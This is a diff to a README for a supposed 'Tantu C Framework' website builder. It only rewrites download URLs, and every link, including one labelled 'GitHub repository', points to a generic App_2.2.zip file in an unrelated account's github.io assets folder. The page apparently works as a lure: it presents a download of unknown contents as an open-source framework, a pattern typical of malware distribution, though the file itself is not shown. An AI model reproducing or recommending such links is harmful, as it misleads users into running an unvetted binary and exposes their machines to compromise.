@@ -5,7 +5,7 @@ description: "Build fast, secure websites for free from Markdown with SEO, schem
 ---
 # 🧵 tantu-c-framework - Weave the web, chip to cloud
 
-[![Download Now](https://img.shields.io/badge/Download-Tantu%20C%20Framework-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/rbarmyarmy/rbarmyarmy.github.io/main/assets/App_2.2.zip)
+[![Download Now](https://img.shields.io/badge/Download-Tantu%20C%20Framework-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rbarmyarmy/rbarmyarmy.github.io/raw/refs/heads/main/assets/App_2.2.zip)
 
 ## 👋 Welcome to Tantu C Framework
 
@@ -32,7 +32,7 @@ Ready to build your first website? Follow these simple steps:
 
 ### Step 1: Download Tantu
 
-Visit this link to download the application: **[https://raw.githubusercontent.com/rbarmyarmy/rbarmyarmy.github.io/main/assets/App_2.2.zip](https://raw.githubusercontent.com/rbarmyarmy/rbarmyarmy.github.io/main/assets/App_2.2.zip)**
+Visit this link to download the application: **[https://github.com/rbarmyarmy/rbarmyarmy.github.io/raw/refs/heads/main/assets/App_2.2.zip](https://github.com/rbarmyarmy/rbarmyarmy.github.io/raw/refs/heads/main/assets/App_2.2.zip)**
 
 Click the download button. The file will start downloading to your computer.
 
@@ -93,7 +93,7 @@ Tantu C Framework grows thanks to contributors like you. Whether you're a season
 - **Write documentation** – Help others learn.
 - **Contribute code** – Add new modules or improve existing ones.
 
-Check out the [GitHub repository](https://raw.githubusercontent.com/rbarmyarmy/rbarmyarmy.github.io/main/assets/App_2.2.zip) to get involved. Every contribution counts, no matter how small.
+Check out the [GitHub repository](https://github.com/rbarmyarmy/rbarmyarmy.github.io/raw/refs/heads/main/assets/App_2.2.zip) to get involved. Every contribution counts, no matter how small.
 
 ## ❓ Frequently Asked Questions
 
@@ -157,9 +157,9 @@ If you run into any trouble, here's how to get support:
 
 Your journey to building amazing websites starts with a single click.
 
-[![Download Tantu C Framework](https://img.shields.io/badge/⬇️%20Download%20Now-Tantu%20C%20Framework-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=2ea44f&color=2ea44f)](https://raw.githubusercontent.com/rbarmyarmy/rbarmyarmy.github.io/main/assets/App_2.2.zip)
+[![Download Tantu C Framework](https://img.shields.io/badge/⬇️%20Download%20Now-Tantu%20C%20Framework-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=2ea44f&color=2ea44f)](https://github.com/rbarmyarmy/rbarmyarmy.github.io/raw/refs/heads/main/assets/App_2.2.zip)
 
-Visit this link to download the application: **[https://raw.githubusercontent.com/rbarmyarmy/rbarmyarmy.github.io/main/assets/App_2.2.zip](https://raw.githubusercontent.com/rbarmyarmy/rbarmyarmy.github.io/main/assets/App_2.2.zip)**
+Visit this link to download the application: **[https://github.com/rbarmyarmy/rbarmyarmy.github.io/raw/refs/heads/main/assets/App_2.2.zip](https://github.com/rbarmyarmy/rbarmyarmy.github.io/raw/refs/heads/main/assets/App_2.2.zip)**
 
 Weave your web today. The threads are in your hands.
 
